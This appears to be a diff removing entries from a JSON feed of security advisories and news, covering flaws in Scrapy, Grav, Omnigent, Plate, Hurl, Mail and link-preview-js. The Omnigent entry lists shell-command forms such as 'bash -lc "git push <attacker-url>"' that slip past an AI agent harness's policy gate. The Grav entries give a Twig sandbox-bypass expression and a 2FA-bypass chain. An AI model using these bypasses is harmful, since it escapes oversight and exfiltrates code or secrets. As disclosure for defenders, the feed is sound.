-      "summary": "### Problem\n\nScrapy\u2019s `S3DownloadHandler` sends signed S3 requests over plaintext HTTP by default.\n\nA normal request like `s3://bucket/key` is converted into `http://bucket.s3.amazonaws.com/key` unless `request.meta[\"is_secure\"]` is explicitly set. The generated request is then signed with configured AWS credentials, so AWS authorization material can be sent without TLS.\n\nVulnerable code in `scrapy/core/downloader/handlers/s3.py`:\n\n```python\nscheme = \"https\" if request.meta.get(\"is_secure\") else \"http\"\nurl = f\"{scheme}://{bucket}.s3.amazonaws.com{path}\"\n```\n\nThe request is then signed and dispatched:\n\n```python\nself._signer.add_auth(awsrequest)\nrequest = request.replace(url=url, headers=awsrequest.headers.items())\n```\n\n### Impact\n\nUsers making Scrapy `s3://` requests with AWS credentials are impacted.\n\nA network attacker able to observe traffic between Scrapy and S3, such as a public Wi-Fi attacker, compromised router, ISP/corporate network observer, or local network attacker using ARP spoofing, can read:\n\n```text\nbucket/key path\nAWS Authorization header\nX-Amz-Security-Token, if temporary credentials are used\nS3 object contents\nS3 response headers\n```\n\nAn active MITM attacker can also modify the plaintext S3 response body, status code, and headers before Scrapy processes it. This can cause scraped data poisoning, poisoned exports, HTTP cache poisoning when cache is enabled, and influence over later crawl targets through forged redirects or attacker-controlled links.\n\n\nSuggested classification: **CWE-319: Cleartext Transmission of Sensitive Information**.\n\n\n### PoC\n\nA minimal PoC creates an `s3://` request, enables fake AWS settings, captures the request produced by `S3DownloadHandler`, and prints the rewritten URL and auth headers.",
-      "link": "https://github.com/advisories/GHSA-76g3-c3x4-crvx",
-      "published": "2026-09-02T22:50:44Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-84366"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-62676",
-      "title": "Omnigent Guardrail policy bypass: shell-command parser fails open in policies/builtins/_shell.py",
-      "summary": "**Reporter:** Aaron / Aeon \u2014 autonomous security agent (https://github.com/aaronjmars/aeon)\n**Project:** `omnigent-ai/omnigent` v0.1.0 (Databricks) \u2014 meta-harness running Claude Code / Codex / Pi \"in check with policies and sandboxing\"\n**Component:** `omnigent/policies/builtins/_shell.py` (shared parser) \u2192 consumed by `policies/builtins/github.py` (`write_repos`/`write_branches` allowlist) and `policies/builtins/working_dir.py` (workspace confinement)\n\n## Summary\n\nThe shared shell-command parser **fails open**. When a gated command spells something the parser doesn't recognize, it produces no operation, the policy evaluator returns `None`, and `None` = abstain = **ALLOW**. So any command the parser misses bypasses both the GitHub repo/branch allowlist and the working-directory confinement \u2014 the product's two core safety guarantees.\n\n## Impact\n\nA misaligned or prompt-injected agent that is *meant to be confined* can:\n\n- `git push` to an attacker-controlled repo (code / secret exfiltration),\n- push to a protected branch,\n- escape its workspace via `git worktree add` / `git -C <other-dir>`.\n\n## Bypass classes (all verified against the real policy code)\n\n- **Combined interpreter flags:** `bash -lc \"git push <attacker-url>\"`\n- **Unlisted wrappers:** `timeout` / `nice` / `setsid` / `stdbuf \u2026 git push \u2026`\n- **Command substitution:** `x=$(git push <attacker-url>)`\n- **Un-split background operator:** `true & git push <attacker-url>`\n\nControls that **correctly hold** (confirming this is parser incompleteness, not an allowlist logic error): bare `git push <attacker-url>` and `env git push \u2026` both **DENY**.\n\n## Suggested fix\n\nMake the gated surface **fail closed**:\n\n1. An unrecognized gated command must **DENY**, not return `None` \u2192 ALLOW. Abstain on a security gate should resolve to deny, not allow.\n2. Canonicalize known wrappers (`timeout` / `nice` / `setsid` / `stdbuf` / `env`) down to their inner command before evaluation.\n3. Recurse into `sh -c` / `bash -c` payloads and com",
-      "link": "https://github.com/advisories/GHSA-7mqg-cx4g-x2rf",
-      "published": "2026-09-02T22:40:07Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-62676"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-65842",
-      "title": "Plate: SSRF with response disclosure in DOCX image embedding",
-      "summary": "## Summary\n\n`@platejs/docx-io` can fetch remote image URLs while converting HTML to DOCX. When an application converts attacker-controlled HTML in a server-side or privileged environment, this can cause the application environment to make unintended outbound requests and include fetched image data in the generated DOCX.\n\n## Impact\n\nApplications are affected when they use `@platejs/docx-io` to convert untrusted HTML that may contain remote image references, especially in server-side conversion workflows or environments with access to internal network resources.\n\nAffected package:\n\n- `@platejs/docx-io` versions `< 53.3.2`\n\n## Patched versions\n\nUpgrade to `@platejs/docx-io` version `53.3.2` or later.\n\n## Workarounds\n\nIf you cannot upgrade immediately, do not pass untrusted HTML with remote image URLs to DOCX export. Sanitize untrusted HTML to remove remote image references, convert trusted images to data URIs before conversion, or run conversion in an environment with restricted outbound network access.\n\n## Credits\n\nThanks to EQSTLab for reporting this issue.",
-      "link": "https://github.com/advisories/GHSA-4q39-2jhr-7qx8",
-      "published": "2026-09-02T22:14:54Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-65842"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-63481",
-      "title": "Hurl: Cookies in Cookies section leak when redirecting to a different host",
-      "summary": "## The Bug\n\nHurl <= 8.0.1 lets you define cookies two ways in a .hurl file:\n\n1. As a raw Cookie: header in the [Header]/headers area\n2. In a dedicated [Cookies] section (parsed into RequestSpec.cookies)\n\nWhen following a redirect to a different host, Hurl correctly strips security-sensitive data (Authorization, Cookie header, and basic-auth user) to avoid leaking credentials cross-host \u2014 mirroring libcurl's default behavior. But it only stripped the cookie that came in as a header. Cookies declared in the [Cookies] section were carried over to the new host unchanged \u2014 a credential-leak bug. \n\nHurl file that leaks cookies:\n\n```hurl\nGET http://localhost:8000/follow-redirect-basic-auth?change_host=true\n[Cookies]\nfruit: lemon\nHTTP 200\n```\n\nHurl file that doesn't leak cookie:\n\n```hurl\nGET http://localhost:8000/follow-redirect-basic-auth?change_host=true\nCookie: fruit=lemon\nHTTP 200\n```\n\n## Patch\n\nWith Hurl <= 8.0.1, user can use `Cookie` header instead of the dedicated `[Cookies]` section.",
-      "link": "https://github.com/advisories/GHSA-7w2g-9mf9-324m",
-      "published": "2026-09-02T22:11:11Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-63481"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-63435",
-      "title": "Mail: Email address spoofing via malformed RFC 2047 encoded-words",
-      "summary": "## Summary\n\nMail::Utilities.q_value_decode and Mail::Utilities.b_value_decode decoded only the first RFC 2047 encoded-word in a string and used an overly greedy pattern to match the charset token. A crafted, malformed encoded-word embedded in an address display name or local part could cause the decoded output to differ from what a human reviewer or downstream parser would expect, allowing an attacker to spoof the apparent sender/recipient address.\n\n## Details\n\nBoth decoders used a single String#match against a pattern such as /\\=\\?(.+)?\\?[Qq]\\?(.*)\\?\\=/m. Two problems:\n\n1. Single match, dropped remainder. Only the first =?charset?Q?...?= (or ?B?) word was decoded. Any additional encoded-words or surrounding text were not handled consistently, so the decoded result could silently omit or alter parts of the input.\n2. Greedy charset capture. (.+)? is greedy and matches across ? delimiters, so a malformed word could span more of the string than a strict RFC 2047 parse would, changing the boundary between \"encoded\" and \"literal\" text.\n\n## Impact\n\nApplications using mail to parse and display or authorize based on decoded header values (From, To, Reply-To, etc.) may present or act on an address different from the one a validator inspecting the raw header would see. Primary risk is spoofing / phishing and authorization-check bypass. No RCE.",
-      "link": "https://github.com/advisories/GHSA-mvxr-6m87-mv2q",
-      "published": "2026-09-02T22:02:32Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-63435"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-62669",
-      "title": "Grav: 2FA Bypass via 'login.regenerate2FASecret' - Secret Rotation During Pending Challenge",
-      "summary": "### Summary\nWhen 2FA is enabled on an account, submitting correct credentials authenticates the user but leaves them unauthorized pending TOTP verification. During this pending-challenge window, the `login.regenerate2FASecret` task which requires only `$user->exists()`, not `$user->authorized`  can be called without a CSRF nonce. It overwrites the victim's `twofa_secret` on disk with an attacker-chosen value, returns the new secret in the JSON response, and the attacker computes a valid TOTP code to complete the 2FA flow. The second factor is **reduced to password-only**. The exploit was confirmed live after enabling 2FA to a user.\n\n### Details\nFour code locations in login plugin v3.8.10 enable the chain:\n\n**1. Session user set even with 2FA pending**  \n`user/plugins/login/login.php` - `userLogin()` assigns `$session->user = $user` before TOTP verification completes. This makes `$this->grav['user']` point to the victim in the pending-challenge window.\n\n**2. `taskRegenerate2FASecret` - no authorization check**  \n`user/plugins/login/classes/Controller.php`\n\n```php\npublic function taskRegenerate2FASecret()\n{\n    $user = $this->grav['user'];\n    if ($user->exists()) {                  // \u2190 only checks exists(), NOT authorized()\n        $secret = $twoFa->createSecret();\n        $user->twofa_secret = $secret;      // overwrites victim's secret on disk\n        $user->save();\n        $json_response = [\n            'status' => 'success',\n            'image' => $image,\n            'secret' => trim(preg_replace('|(\\w{4})|', '\\\\1 ', $secret)) // \u2190 returned to attacker\n        ];\n    }\n}\n```\n\n**3. No CSRF nonce required**  \n`user/plugins/login/login.php` - the task dispatch switch only validates `twofa_cancel` for nonce. `regenerate2FASecret` is not guarded, making it exploitable via a single unauthenticated GET request on the victim's session.\n\n### PoC\n**Confirmed live** on this instance after enabling `plugins.login.twofa_enabled: true` and configuring TOTP on the `user` accou",
-      "link": "https://github.com/advisories/GHSA-7mgc-c7pq-3rr3",
-      "published": "2026-09-02T22:01:25Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-62669"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-62677",
-      "title": "Omnigent: Unvalidated os_env.cwd in agent bundle yields arbitrary host filesystem access on runners without OMNIGENT_RUNNER_WORKSPACE",
-      "summary": "### Summary\n\nAn authenticated, non-admin user can obtain **arbitrary host-filesystem read/write** (and host environment-secret disclosure) on an Omnigent **runner** by uploading an agent bundle whose `os_env.cwd` points outside any intended workspace (e.g. `/` or `/home/<victim>`). The `cwd` field is taken **verbatim** from the bundle with no validation, normalization, or boundary check anywhere in the spec pipeline.\n\nThis is a **different sink** from GHSA-jrrm-9hc7-2v3h (CWE-94, shared-agent bundle overwrite -> stdio MCP RCE). It shares the bundle-upload *vector* but is reached through the user's **own** session-scoped agent and is **not** addressed by that advisory's proposed shared-agent guard.\n\n### Preconditions\n\n- Runner realizes a session-scoped uploaded bundle **without** `OMNIGENT_RUNNER_WORKSPACE` set. When that env var is set (CLI- and host-launched sessions set it), the spec `cwd` is overridden and the attack is neutralized \u2014 so this is deployment-gated, not universal.\n- Attacker is any authenticated user (no admin scope; `_require_user` only checks identity). No shared-agent overwrite needed.\n\n### Details (verified against code)\n\n1. **Parse \u2014 no validation.** `omnigent/spec/parser.py:696` stores `cwd=str(cwd_raw)` verbatim. Absolute paths (`/`, `/etc`), `../..`, etc. are all accepted. The `sandbox.type` is likewise author-chosen and `\"none\"` is legal.\n2. **Validate \u2014 cwd unconstrained.** `omnigent/spec/validator.py` `_validate_os_env` checks only fork/scratch/egress combinations; it never references `cwd` (the sole mention, line ~526, is a comment). No boundary is applied to the cwd itself. The boundary in `server/schemas.py` validates a *caller-supplied workspace against* the spec cwd (treating the author cwd as trusted) and only for host-launched sessions \u2014 it does not bound the cwd.\n3. **Sink.** `omnigent/inner/os_env.py:890` sets `cwd = Path(spec.cwd or os.getcwd()).resolve(strict=False)` as the environment root; `os_env.py:934` does `shutil.copytree",
-      "link": "https://github.com/advisories/GHSA-p8rw-8qj3-hf33",
-      "published": "2026-09-02T22:00:54Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-62677"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-62674",
-      "title": "Omnigent: Shared Agent Bundle Overwrite Leads to Authenticated Runner RCE",
-      "summary": "### Summary\n\nAn authenticated user with edit access to their own session can overwrite a shared/template agent by uploading a full agent bundle through `PUT /sessions/{session_id}/agent`.\n\nShared/template agents are shown as not MCP-editable, but this upload path still accepts a replacement bundle. By adding a `stdio` MCP server to the shared agent, the attacker can cause future runner sessions using that shared agent to start an attacker-controlled command.\n\n### Details\n\nThe vulnerable endpoint is the full agent bundle upload route: [`PUT /sessions/{session_id}/agent`](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L18979-L19077) \nThis route checks whether the caller can edit the session: [`LEVEL_EDIT` session permission check](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L19003-L19025)\nBut it does not check whether the bound agent is a shared/template agent.\nShared/template agents have:\n```python\nagent.session_id is None\n```\nThe API already exposes that these agents are not meant to be MCP-editable: [`mcp_servers_editable` is false for shared/template agents](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L18842-L18857)\nThe direct MCP edit endpoint correctly blocks shared/template agents: [`session_mcp_servers.py` shared-agent guard](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/session_mcp_servers.py#L170-L183)\n```python\nif agent.session_id is None:\n    raise OmnigentError(\"Built-in agents are read-only through this endpoint.\")\n```\nThe full bundle upload endpoint is missing that same guard. It stores the uploaded bundle and updates the agent row: [`agent_store.update(agent.id, new_loc)`](https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/",
-      "link": "https://github.com/advisories/GHSA-jrrm-9hc7-2v3h",
-      "published": "2026-09-02T21:55:11Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-62674"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-61842",
-      "title": "Grav: Twig sandbox config exfiltration via grav.offsetGet + dump filter (CVE-2026-44738 bypass)",
-      "summary": "### Summary\n\nThe Twig content sandbox replaces `config` with the redacted `SandboxConfig` facade and strips `Config::get`/`toArray` from the method allowlist (GHSA-j274-39qw-32c9), so editor content can't read config secrets via `config`. That's bypassable: `grav` is the raw container, `offsetget` is allow-listed on it, so `grav.offsetGet('config')` returns the real `Config`. The allow-listed filters `json_encode`/`print_r`/`yaml_encode` then serialize it at the PHP level, never hitting the sandbox method gate, dumping the whole config tree including every `plugins.*` secret (SMTP creds, API keys, plugin DB creds). Incomplete fix for GHSA-j274-39qw-32c9. `security.salt` does not leak (it lives outside config).\n\n### Details\n\nThe documented path is blocked: `config` is the `SandboxConfig` facade (`Twig.php:660`) and the raw `Config`/`Data` method entries are stripped when `config_access` is false, so `{{ config.get(...) }}` returns the default and `{{ grav.offsetGet('config').get(...) }}` raises `SecurityNotAllowedMethodError`.\n\nThe bypass uses two allow-listed primitives the redaction doesn't cover:\n\n1. `grav.offsetGet('config')` returns the raw `Config`. The `SandboxConfig` facade replaces only the `config` variable, not `grav['config']`; `offsetget` is allow-listed on `Grav\\Common\\Grav` in `system/config/security.yaml`.\n2. `json_encode`/`print_r`/`yaml_encode` serialize the object inside the filter and never call `GravSecurityPolicy::checkMethodAllowed` (`GravSecurityPolicy.php:65`), so the stripped methods don't matter.\n\nBug class: object-dumping filters bypass the sandbox member gate. The same dump reaches `page`/`pages`/`uri`/`user` via their allow-listed accessors; `config` is the secret-bearing target.\n\nReachable below the publisher-Twig opt-in: a `_`-prefixed slug is modular (`Page.php:228`), and `Page::content()` sets `$process_twig = $scan_twig_xss || $this->modularTwig()` (`Page.php:816`), so a modular child's body Twig is sandboxed-rendered even with `twi",
-      "link": "https://github.com/advisories/GHSA-mc5q-6hpj-rp7j",
-      "published": "2026-09-02T21:41:12Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-61842"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-61704",
-      "title": "link-preview-js DNS Rebinding SSRF Bypass / Incomplete Fix for CVE-2026-43897",
-      "summary": "The existing advisory GHSA-4gp8-rjrq-ch6q / CVE-2026-43897 states that the SSRF issue was fixed in 4.0.1. However, 4.0.3 remains bypassable when the documented resolveDNSHost mitigation is used.\n\nRoot cause:\nThe library validates one resolved IP address through resolveDNSHost, but later performs fetch() against the original hostname without pinning the connection to the validated IP. An attacker-controlled DNS server can return a public IP during validation and a loopback/internal IP during the final connection.\n\nImpact:\nThis allows an attacker to bypass the documented SSRF mitigation and make the server-side fetch reach loopback or internal addresses under DNS rebinding conditions.\n\nThis appears to be either an incomplete fix for CVE-2026-43897 or a new DNS rebinding SSRF bypass affecting the latest version.\n\nThe PoC was reproduced in a local-only controlled environment to avoid targeting production or third-party systems. Evidence and reproduction details can be provided privately.",
-      "link": "https://github.com/advisories/GHSA-cpjf-6666-r8fx",
-      "published": "2026-09-02T21:29:57Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-61704"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.bleepingcomputer.com/news/security/hackers-exploit-sangoma-switchvox-flaw-to-deploy-reverse-shells/",
-      "title": "Hackers exploit Sangoma Switchvox flaw to deploy reverse shells",
-      "summary": "Attackers are actively exploiting CVE-2026-9586, an unauthenticated SQL injection vulnerability in the Sangoma Switchvox VoIP platform that can lead to remote code execution. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/hackers-exploit-sangoma-switchvox-flaw-to-deploy-reverse-shells/",
-      "published": "2026-09-02T21:00:13+00:00",
-      "source": "Bleeping Computer",
-      "tags": [
-        "news",
-        "malware"
-      ],
-      "cve_ids": [
-        "CVE-2026-9586"
       ],
       "is_zero_day": false,
       "is_high_severity": true
